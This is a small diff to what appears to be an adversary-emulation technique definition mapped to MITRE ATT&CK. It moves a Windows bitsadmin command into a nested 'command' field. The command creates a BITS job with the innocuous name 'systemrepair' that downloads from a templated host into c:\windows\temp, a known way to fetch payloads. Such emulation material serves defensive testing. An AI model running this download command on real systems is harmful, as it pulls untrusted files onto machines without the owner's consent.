@@ -9,5 +9,6 @@ mitre_technique:
   platform: Windows
 commands:
   - module: exec_shell
-    input: bitsadmin /transfer systemrepair /download /priority normal {{ bits_admin_dest_host }} c:\windows\temp\file.txt
+    input:
+      command: bitsadmin /transfer systemrepair /download /priority normal {{ bits_admin_dest_host }} c:\windows\temp\file.txt
     sleep: 1
